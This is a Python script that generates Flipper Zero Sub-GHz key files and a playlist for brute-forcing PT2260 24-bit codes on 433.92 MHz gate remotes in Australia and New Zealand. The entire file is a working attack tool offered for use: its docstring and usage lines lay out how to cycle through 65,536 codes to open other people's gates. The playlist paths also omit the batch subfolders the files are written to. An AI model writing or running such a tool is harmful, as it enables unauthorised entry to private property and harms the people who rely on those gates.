#!/usr/bin/env python3
"""
PT2260 24-bit Brute Force Generator for Australian 433.92 MHz Gates
Flipper Zero Sub-GHz Playlist Compatible

Generates individual .sub files for PT2260 24-bit codes and a playlist file.

PT2260 protocol: 24-bit code, TE ~350us, OOK modulation
Common on generic Chinese gate remotes, 433.92 MHz clones sold in AU/NZ
Default range: 0x000000 - 0x00FFFF (65536 codes, most common address space)

Usage:
    python pt2260_bruteforce_gen.py --output-dir ../../car_hacks_au/gates/pt2260_bf/
    python pt2260_bruteforce_gen.py --output-dir ../../car_hacks_au/gates/pt2260_bf/ --range 0x000000 0x00FFFF
    python pt2260_bruteforce_gen.py --playlist-only --output-dir ../../car_hacks_au/gates/pt2260_bf/
"""

import argparse
import os
from pathlib import Path


PT2260_BIT = 24
PT2260_TE = 350
PT2260_FREQ = 433920000
PT2260_PRESET = "FuriHalSubGhzPresetOok650Async"


def int_to_pt2260_key(code: int) -> str:
    """Convert a 24-bit PT2260 code to 8-byte hex key format."""
    if code < 0 or code > 0xFFFFFF:
        raise ValueError(f"PT2260 24-bit code must be 0x000000-0xFFFFFF, got 0x{code:06X}")
    # 24-bit code right-aligned in 8 bytes
    return f"00 00 00 00 00 {(code >> 16) & 0xFF:02X} {(code >> 8) & 0xFF:02X} {code & 0xFF:02X}"


def generate_pt2260_sub(code: int, output_path: Path):
    """Generate a single PT2260 .sub Key File."""
    key_hex = int_to_pt2260_key(code)
    content = f"""Filetype: Flipper SubGhz Key File
Version: 1
Frequency: {PT2260_FREQ}
Preset: {PT2260_PRESET}
Protocol: PT2260
Bit: {PT2260_BIT}
Key: {key_hex}
TE: {PT2260_TE}
"""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(content, encoding="utf-8")


def generate_playlist(output_dir: Path, start: int, end: int):
    """Generate a playlist .txt pointing to all generated .sub files."""
    playlist_path = output_dir / "pt2260_bruteforce_playlist.txt"
    lines = [
        "# PT2260 24-bit Brute Force Playlist",
        f"# Code range: 0x{start:06X} - 0x{end:06X}",
        f"# Total files: {end - start + 1}",
        f"# Frequency: {PT2260_FREQ} (433.92 MHz AU)",
        f"# Protocol: PT2260, Bit: {PT2260_BIT}, TE: {PT2260_TE}",
        "#",
    ]
    for code in range(start, end + 1):
        sd_path = f"/ext/subghz/car_hacks_au/gates/pt2260_bf/pt2260_{code:06X}.sub"
        lines.append(sd_path)

    playlist_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[+] Playlist -> {playlist_path}")


def main():
    parser = argparse.ArgumentParser(
        description="PT2260 24-bit Brute Force Generator for AU 433.92 MHz"
    )
    parser.add_argument(
        "--output-dir", type=str, default="pt2260_bf",
        help="Output directory for generated .sub files"
    )
    parser.add_argument(
        "--range", nargs=2, type=lambda x: int(x, 0), default=[0x000000, 0x00FFFF],
        metavar=("START", "END"),
        help="Code range in hex (default: 0x000000 0x00FFFF = 65536 codes)"
    )
    parser.add_argument(
        "--playlist-only", action="store_true",
        help="Only generate playlist, skip .sub file generation"
    )
    parser.add_argument(
        "--batch-size", type=int, default=1024,
        help="Files per subdirectory (default: 1024)"
    )

    args = parser.parse_args()
    output_dir = Path(args.output_dir)
    start, end = args.range

    if not args.playlist_only:
        total = end - start + 1
        print(f"[*] Generating {total} PT2260 .sub files (0x{start:06X} - 0x{end:06X})...")
        print(f"[*] Output: {output_dir.resolve()}")

        for code in range(start, end + 1):
            batch = code // args.batch_size
            batch_dir = output_dir / f"batch_{batch:04X}"
            filename = f"pt2260_{code:06X}.sub"
            generate_pt2260_sub(code, batch_dir / filename)

            if (code - start + 1) % 2000 == 0:
                print(f"  ... {code - start + 1}/{total} files generated")

        print(f"[+] Generated {total} .sub files")

    generate_playlist(output_dir, start, end)


if __name__ == "__main__":
    main()
